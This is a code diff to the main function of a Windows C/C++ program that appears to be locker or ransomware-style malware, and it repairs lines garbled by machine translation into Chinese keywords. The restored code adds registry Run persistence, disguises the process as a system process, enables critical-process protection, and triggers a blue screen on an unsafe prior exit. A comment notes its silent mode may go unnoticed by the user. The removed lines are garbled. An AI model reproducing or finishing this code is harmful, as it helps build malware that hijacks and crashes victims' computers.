@@ -610,7 +610,7 @@ int wmain(int argc, wchar_t* argv[]) {
     SetupRegistryRun();
 
     // 伪装系统进程
-disguiseAsSystemProcess();
+    disguiseAsSystemProcess();
 
     // 启用关键进程保护
     enableCriticalProcess(true);
@@ -633,28 +633,28 @@ disguiseAsSystemProcess();
     int lastSafe = ReadSafeStatus();
     if (lastSafe == 0) {
         // 上次非安全退出，立即蓝屏
-写死亡笔记();();
-睡眠(500);Sleep(500);
-触发蓝屏();();
-        当 (1） 睡眠(1000);
+        writeDeathNote();
+        Sleep(500);
+        triggerBSOD();
+        while (1) Sleep(1000);
     }
     // 标记本次尚未安全退出
-    写入安全状态(false);
+    WriteSafeStatus(false);
 
     // 执行挑战逻辑
-    如果 (!silent) {
+    if (!silent) {
         // 显示控制台以进行交互
-        如果 (!nohide) 隐藏控制台(false）;
-        显示挑战界面(）;
+        if (!nohide) HideConsole(false);
+        ShowChallengeUI();
     }
     else {
         // 静默模式：仍然需要挑战，但不弹出窗口？为了隐蔽，可写入日志或定时检测
         // 简单起见，静默模式下也显示控制台，但用户可能不知道
-        if (!nohide) 隐藏控制台(false);
-        显示挑战界面();
+        if (!nohide) HideConsole(false);
+        ShowChallengeUI();
     }
 
     // 理论上不会执行到这里
-    安全退出();
-    返回 0;
+    safeExit();
+    return 0;
 }
